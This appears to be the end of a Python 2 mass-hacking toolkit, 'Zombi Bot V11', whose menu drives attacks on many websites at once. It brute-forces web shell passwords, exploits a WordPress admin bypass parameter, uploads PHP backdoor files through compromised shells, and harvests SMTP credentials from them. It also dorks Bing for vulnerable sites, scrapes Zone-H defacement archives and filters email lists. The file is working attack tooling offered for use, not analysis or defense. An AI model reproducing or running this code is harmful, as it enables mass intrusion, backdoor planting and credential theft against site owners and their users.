        fand = raw_input("{}{}\n\t\t[#] Done !! ..Exiting".format(fy, sb))
        f.close()
    elif 'Windows' in html:
        print("{}{}\n\t[+] Done !! Password Found Succesfully // P@ssw0rd ==> ".format(fg, sb)) + ("{}{}" + (password)).format(fc, sb)
        f = open('Result-BruteForce/Shell.txt', 'a')
        f.write('Done !! Password Found // Shell Url : ' + site + ' Password Of Shell ==> ' + password)
        f.write('\n')
        f.close()
        print("")
        fand = raw_input("{}{}\n\t\t[#] Done !! ..Exiting".format(fy, sb))
        f.close()
    elif 'FreeBSD' in html:
        print("{}{}\n\t[+] Done !! Password Found Succesfully // P@ssw0rd ==> ".format(fg, sb)) + ("{}{}" + (password)).format(fc, sb)
        f = open('Result-BruteForce/Shell.txt', 'a')
        f.write('Done !! Password Found // Shell Url : ' + site + ' Password Of Shell ==> ' + password)
        f.write('\n')
        f.close()
        print("")
        fand = raw_input("{}{}\n\t\t[#] Done !! ..Exiting".format(fy, sb))
        f.close()
    else:
        print("")
        print ("{}{}\t\t[-] Not Him , Tryng Other...:(".format(fr, sb))

def bypass(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0','Accept': '/'}
        url = url.rstrip()
        xploit = '/?up_auto_log=true'
        s = requests.get('http://'+url+xploit,headers=headers)
        r = requests.get('http://'+url+xploit,headers=headers)
        if '<li id="wp-admin-bar-edit-profile"><a' in r.content:
            print("{}{}[ + ] Wp-Admin Bypassed With Succes => ".format(fg,sb)) + ('{}{}http://'+(url)).format(fc,sb)
            f = open("Results/Bypassed.txt","a")
            f.write(url+xploit+'\n')
            f.close()
            m = requests.get('http://'+url+'/?up_auto_log=true',headers=headers)
            b = requests.get('http://'+url+'/wp-admin')
            if '<li id="wp-admin-bar-edit-profile"><a' in b.content:
                print("{}{}[ + ] Wp-Admin Bypassed With Succes => ".format(fg,sb)) + ('{}{}http://'+(url)).format(fc,sb)
        else:
            print("{}{}[ - ] Wp-Admin Failed Bypassed => ".format(fr,sb)) + ('{}{}http://'+(url)).format(fc,sb)
    except:
        pass
def bypassed():
    if True:
        byp = raw_input("{}{}\n\t[-] Put Your List Sites (Delete 'http://' from ur list Wordpress) => ".format(fy,sb))
        byp = open(byp,'r').readlines()
        cls()
        print('{}{}'+(siyass)).format(fg,sb) + ('\n\t\t\t    [ Wordpress Admin Panel Bypassed By Viper 1337 ]')
        print""                     
        ThreadPool = Pool (14)
        Threads = ThreadPool.map (bypass,byp)
    #except:
        #pass
def removeduplicates():
    remove = raw_input('\n\t{}{}[*] Enter Name List Sites => '.format(fy,sb))
    duplicates = open(remove , 'r').readlines()
    rmav = raw_input('{}{}\n\t\t[*] Enter Name text Cleaned => '.format(fy,sb))
    rmav = open(rmav , 'w')
    cls()
    print('{}{}'+(siyass)).format(fg,sb)+'\n\t\t\t[ Remove Duplicates Of Sites By Viper 1337 ]'
    rmv = set(duplicates)
    for line in rmv:
        print("")
        print("{}{}Remove Duplicate ...".format(fg,sb)) + ('{}{}'+(line)).format(fc,sb)
        rmav.write(line)
def kala(i):
    if not 'http://' in i:
        i = 'http://' + i
    try:
        i = i.rstrip()
        r = requests.get(i)
        if 'wp-content' in r.content:
            print("{}{}[+] Wordpress... ==> ".format(fg, sb)) + ("{}{}" + (i)).format(fc, sb)
            file = open('tmp/Wordpress.txt', 'a')
            file.write(i)
            file.write('\n')
        elif 'Joomla!' in r.content:
            print("{}{}[+] Joomla... ==> ".format(fg, sb)) + ("{}{}" + (i)).format(fc, sb)
            file = open('tmp/Joomla.txt', 'a')
            file.write(i)
            file.write('\n')
        elif 'Drupal' in r.content:
            print("{}{}[+] Drupal... ==> ".format(fg, sb)) + ("{}{}" + (i)).format(fc, sb)
            file = open('tmp/Drupal.txt', 'a')
            file.write(i)
            file.write('\n')
        elif 'PrestaShop' in r.content:
            print("{}{}[+] PrestaShop... ==> ".format(fg, sb)) + ("{}{}" + (i)).format(fc, sb)
            file = open('tmp/PrestaShop.txt', 'a')
            file.write(i)
            file.write('\n')
        elif 'opencart' in r.content:
            print("{}{}[+] OpenCart... ==> ".format(fg, sb)) + ("{}{}" + (i)).format(fc, sb)
            file = open('tmp/OpenCart.txt', 'a')
            file.write(i)
            file.write('\n')
        else:
            print("{}{}[!] Unknown..! ==> ".format(fr, sb)) + ("{}{}" + (i)).format(fc, sb)
            file = open('tmp/Unknown.txt', 'a')
            file.write(i)
            file.write('\n')
    except:
        pass


def cms():
    victimesite = raw_input(('{}{}\n\t[-] Put The List Of Sites For Checking =>  ').format(fy, sb))
    victimesite = open(victimesite, 'r').readlines()
    cls()
    print('{}{}'+(siyass)).format(fg,sb) + ('\n\t\t\t  [ Cms Detector ( joomla,drupal,wordpress.. ) By Viper 1337 ]')
    print("")
    ThreadPool = Pool(14)
    Threads = ThreadPool.map(kala, victimesite)


def vv():
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', 'Firefox')]
    script = raw_input("{}{}\n[-] Give Me Script : ".format(fy,sb))
    sites = raw_input("{}{}\n\tGive Me List Shells : ".format(fy,sb))
    sites = open(sites,'r').readlines()
    cls()
    print('{}{}'+(siyass)).format(fg,sb) + ('\n\t\t\t   [ Upload Any Script To ur Shellz By Viper 1337 ]')
    print ""
    for url in sites:
        try:
            url = url.rstrip()
            br.open(url)
            br.select_form(method="post" ,enctype="multipart/form-data")
            br.form.add_file(open(script), 'text/plain', script)
            br.submit()
            br.open(url)
            br.select_form(method="post" ,enctype="multipart/form-data")
            br.form.add_file(open('files/wp-logs.php'), 'text/plain', 'files/wp-logs.php')
            br.submit()
            br.open(url)
            br.select_form(method="post" ,enctype="multipart/form-data")
            br.form.add_file(open('files/wp-admini.php'), 'text/plain', 'files/wp-admini.php')
            br.submit()
            sys = url.split("/")
            replace = url.replace(sys[len(sys)-1] , script)
            t = url.replace(sys[len(sys)-1] , 'wp-logs.php')
            br.open(t)
            uplo = open("Uploading.txt", 'a')
            uplo.write(replace + "\n")
            print("{}{}[+] Uploading ==> ".format(fw,sb)) + ("{}{}[OK] : ".format(fg,sb)) + ("{}{}" + (replace)).format(fc,sb)
        except:
            print("{}{}[-] Uploading ==> ".format(fw,sb)) + ("{}{}[FAILED] : ".format(fr,sb)) + ("{}{}" + (url)).format(fc,sb)

def filter1():
    print('{}{}\n\n\t\t[1] - Country Filtre (exp : ca net com us)').format(fg, sb)
    print('{}{}\n\t\t[2] - Domain Filtre (exp : hotmail gmail aol yahoo)').format(fg, sb)
    filt = raw_input(("{}{}\n\n\t[*] What You Wanna Choose? >>> ").format(fy, sb))
    if filt == '1':
        filters()
    elif filt == '2':
        filters2()
    else:
        pass


def filters():
    list = raw_input(('{}{}\n\t\t[+] Enter Name Of Mailist For Filter It ==> ').format(fy, sb))
    type = raw_input(('{}{}\n\t\t\t[+] Enter Type Of Country You Wanna Filter (exp : ca com net) ==> ').format(fc, sb))
    cls()
    print('{}{}'+(siyass)).format(fg,sb) + ("\n\t\t\t    [ Filter Email's & Sites by domain | By Viper 1337 ]")
    print ""
    file = open(list).readlines()
    if (len(file) > 0):
        for ip in file:
            sites = ip.rstrip()
            type2 = '.' + (type)
            if type2 in sites:
                print ('{}{}\t ---> '.format(fw, sb)) + ('{}{}' + (sites)).format(fg, sb) + ('{}{} <---'.format(fw, sb))
                f = open('Result.txt', 'a')
                f.write(sites)
                f.write('\n')
            else:
                pass
    fa = raw_input("{}{}\n\t\t\tResult Has Saved To Result.txt ... ".format(fy, sb))


def filters2():
    list = raw_input(('{}{}\n\t\t[+] Enter Name Of Mailist For Filter It ==> ').format(fy, sb))
    type = raw_input('{}{}\n\t\t\t[+] Enter Type Of Domain You Wanna Filter (exp : gmail aol yahoo) ==> ').format(fc, sb)
    cls()
    print('{}{}'+(siyass)).format(fg,sb) + ("\n\t\t\t    [ Filter Email's & Sites by domain | By Viper 1337 ]")
    print ""
    file = open(list).readlines()
    if (len(file) > 0):
        for ip in file:
            sites = ip.rstrip()
            type2 = (type)
            if type2 in sites:
                print ('{}{}\t ---> '.format(fw, sb)) + ('{}{}' + (sites)).format(fg, sb) + ('{}{} <---'.format(fw, sb))
                f = open('Result2.txt', 'a')
                f.write(sites)
                f.write('\n')
        fa = raw_input("{}{}\n\t\t\tResult Has Saved To Result2.txt ... ".format(fy, sb))
def mirror():
    try:
        __Defacer = raw_input("{}{}\n\t[-] Give Me The Defacer Name ==> ".format(fy, sb))
        __ZH = raw_input("{}{}\n\t\t[-] Give Me ZHE ==> ".format(fy, sb))
        __PHPSESSID = raw_input("{}{}\n\t\t\t[-] Give me PHPSESSID ==> ".format(fy, sb))
        __ZHE = raw_input("{}{}\n\t\t\t\t[-] Give Me Again ZHE ==> ".format(fy, sb))
        cls()
        print('{}{}'+(siyass)).format(fg,sb) + ("\n\t\t\t    [ Zone H Mirror Grabber By Viper 1337 ]")
        print ""
        page = 1
        print ("\t{}{}Notifier Is ==> ".format(fr, sb)) + ("{}{}" + (__Defacer)).format(fg, sb)
        while True:
            url = 'http://zone-h.com/archive/notifier=' + __Defacer + '/page=' + str(page)
            page = page + 1
            sess = requests.session()
            my_cookie = {

                'ZHE': __ZHE,
                'ZH': __ZH,
                'PHPSESSID': __PHPSESSID
            }

            Open = sess.get(url, cookies=my_cookie, timeout=10)
            print Open.text
            Hunt_urls = re.findall('<td>(.*)\n							</td>', Open.content)
            for xx in Hunt_urls:
                print ('{}{}[+] '.format(fg, sb)) + Fore.MAGENTA + xx.split('/')[0]
                with open('Sites_dumped.txt', 'a') as rr:
                    rr.write(xx.split('/')[0] + '\n')

            if page > 50:
                sys.exit()
            else:
                continue
    except:
        pass


def BingDorking(dork):
    try:

        # Get sites from bing

        dork = dork.strip()

        page = 1

        while page <= 1031:

            bing = "https://www.bing.com/search?q=" + str(dork) + "&go=Search&qs=ds&first=" + str(page) + "&FORM=PERE7"

            req = requests.get(bing)

            sites = re.findall('<h2><a href="(.*?)"', req.content)

            page += 10

            for site in sites:
                site = site.strip()

                https = re.findall('://(.*?)/', site)

                for http in https:
                    http = http.strip()
                    print ("{}{}\t[+] => ".format(fg, sb)) + ("{}{}http://".format(fc, sb)) + http
                    open('SitesBing.txt', 'a').write('http://' + http + '\n')


    except:
        pass


def bing():
    ListStie = raw_input("{}{}\n\t[-] Give Me The List OF The DORK => ".format(fy, sb))
    cls()
    print('{}{}'+(siyass)).format(fg,sb) + ("\n\t\t\t    [ Get Sites Fresh Vuln by Dork | By Viper 1337 ]")
    print ""
    ListStie = open(ListStie, 'r').readlines()
    for i in ListStie:
        try:
            i = i.strip()
            data = BingDorking(i)
            pool = ThreadPool(10)
            pool.map(BingDorking, ListStie)
            pool.close()
            pool.join()
        except:
            pass

def bring(url):
    if True:
        Sc = mcscrp()
        url = url.rstrip()
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.addheaders = [('User-agent', 'Firefox')]
        try:
            br.open(url)
            br.select_form(method="post" ,enctype="multipart/form-data")
            br.form.add_file(open('files/wp-site.php'),'text/plain', 'files/wp-site.php')
            br.submit()
            br.open(url)
            br.select_form(method="post" ,enctype="multipart/form-data")
            br.form.add_file(open('files/wp-logs.php'), 'text/plain', 'files/wp-logs.php')
            br.submit()
            br.open(url)
            br.select_form(method="post" ,enctype="multipart/form-data")
            br.form.add_file(open('files/wp-admini.php'), 'text/plain', 'files/wp-admini.php')
            br.submit()
            sys = url.split("/")
            replace = url.replace(sys[len(sys)-1] , 'wp-site.php')
            t = url.replace(sys[len(sys)-1] , 'wp-logs.php')
            br.open(t)
            print("{}{}[+] Shell Work...Searsh for SMTP --> ".format(fg,sb)) + ("{}{}" + (url)).format(fc,sb)
            replace = replace.rstrip()
            data = requests.get(replace).text
            if 'Ridwane_123' in data:
                for i in Sc.scrp(data,'span')['txt']:
                    print("{}{}[+] Smtp Cracked With Succes --> ".format(fg,sb)) + ("{}{}" + (i)).format(fy,sb)
                    file = open("CrackedSmtps.txt","a")
                    file.write(i)
                    file.write('\n')
            else:
                print("{}{}[-] Sorry we don't find Smtp from this Shell --> ".format(fr,sb)) + ("{}{}" + (url)).format(fc,sb)
        except:
            print("{}{}[-] Sorry we find a probleme with this Shell !.. --> ".format(fr,sb)) + ("{}{}" + (url)).format(fc,sb)
def smtpcrack():
    ridwane = raw_input("{}{}\n\t[-] Give Me List Shells : ".format(fy,sb))
    ridwane = open(ridwane,'r').readlines()
    cls()
    print('{}{}'+(siyass)).format(fg,sb) + ("\n\t\t\t    [ Mass Crack SMTP From Shell's By Viper 1337 ]")
    print ""
    ThreadPool = Pool(20)
    Threads = ThreadPool.map(bring, ridwane)



def menu():
    print("")
    print ("{}{}\t[#] - Choose What U Want: ".format(fc,sb)) + '\t\t\t\t\tAbout Me: \n\t\t\t\t\t\t\t\t\t\tViper 1337 ,Coder , From Russia \n\t\t\t\t\t\t\t\t\t\tMy Facebook: https://web.facebook.com/viper1337official \n\t\t\t\t\t\t\t\t\t\tMy ICQ: 744289868\n\t\t\t\t\t\t\t\t\t\tMy Youtube Channel:\n\t\t\t\t\t\t\t\t\tyoutube.com/channel/UCyUb_3yNXjA6BxlQi_b0E6w\n'
    print '{}{}\t['.format(fc,sb)+'{}{}1'.format(fy,sb)+'{}{}]'.format(fr,sb) + '{}{} - Run Viper 1337 BOT'.format(fg,sb) + '{}{}\t\t\t\t['.format(fc,sb)+'{}{}6'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - Cms Detector (joomla,wp,drupal..)".format(fg,sb)
    print '{}{}\n\t['.format(fc,sb)+'{}{}2'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - Upload Any Script To ur Shellz".format(fg,sb) + '\t\t{}{}['.format(fc,sb)+'{}{}7'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - Email's Filter & Sites Domaine Filter ".format(fg,sb)
    print '{}{}\n\t['.format(fc,sb)+'{}{}3'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - BruteForce Shell Password ".format(fg,sb) + '{}{}\t\t['.format(fc,sb)+'{}{}8'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - Zone H Mirror Grabber".format(fg,sb)
    print '{}{}\n\t['.format(fc,sb)+'{}{}4'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - Auto Admin Wordpress - Bypass".format(fg,sb) + '{}{}\t\t['.format(fc,sb)+'{}{}9'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - Dorker Get Fresh Sites VulN".format(fg,sb)
    print '{}{}\n\t['.format(fc,sb)+'{}{}5'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - Clean - Remove Duplicate From List Sites".format(fg,sb) + '{}{}\t['.format(fc,sb)+'{}{}10'.format(fy,sb)+'{}{}]'.format(fr,sb) + "{}{} - Mass Cracker SMTP From Shell's V2".format(fg,sb)
    question = raw_input("{}{}\n\n\t\tWhich Option U Wanna? >>> ".format(fy,sb))
    if question=='3':
        shell()
    elif question=='4':
        bypassed()
    elif question=='5':
        removeduplicates()
    elif question=='1':
        exploitsrun()
        r = raw_input ("{}{}\n\t\t\t\t[ Zombi Bot V11 Is Done Exploiting... ]".format(fy,sb))
    elif question=='2':
        vv()
    elif question=='6':
        cms()
    elif question=='7':
        filter1()
    elif question=='8':
        mirror()
    elif question=='9':
        bing()
    elif question=='10':
        smtpcrack()
    else:
        print("\n\tWrong: Please Select a option ! (1 or 2 or 3...)")
simple = raw_input("{}{}\n\tViper 1337 Best? (if Yes: menu() , if No: exit) => ".format(fy,sb))
def ridwane(s):
    for c in s + '\n':
        bb = ('{}{}'+c).format(fc,sb)
        sys.stdout.write(bb)
        sys.stdout.flush()
        time.sleep(4. / 60)
def intro(word,ok):
    cls()
    print '\n\n\n'
    print(ok)
    ridwane(word)

if simple == 'Yes':
    print(x)
    print(y)
    intro('\t\t\t  Zombi Bot V11 \n\n\t Contact Me At Facebook: Viper 1337 \n\n\t Contact Me At ICQ: 744289868 \n\n\t My Email: nedjworgan@gmail.com \n\n\t\t Welcome :=)','')
    cls()
    for N, line in enumerate(siyass.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
    print(x)
    print(y)
    menu()
elif simple == 'yes':
    print(x)
    print(y)
    intro('\t\t\t     Zombi Bot V11 \n\n\t Contact Me At Facebook: Viper 1337 \n\n\t Contact Me At ICQ: 744289868 \n\n\t My Email: nedjworgan@gmail.com \n\n\t\t Welcome :=)','')
    cls()
    for N, line in enumerate(siyass.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
    print(x)
    print(y)
    menu()
else:
    print("\n\tPlease type 'Yes' for enter to menu ")
    exit(-1)



